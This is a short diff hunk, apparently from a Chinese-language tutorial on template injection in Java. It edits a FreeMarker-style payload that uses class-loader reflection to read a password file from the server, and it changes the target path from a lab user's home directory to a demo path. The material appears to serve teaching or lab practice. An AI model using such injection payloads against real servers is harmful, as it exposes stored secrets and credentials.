@@ -123,7 +123,7 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
       .getCodeSource()
       .getLocation()
       .toURI()
-      .resolve("/home/carlos/my_password.txt")
+      .resolve("/tmp/reverselab-demo/my_password.txt")
       .toURL()
       .openStream()
       .readAllBytes()?join(" ")}
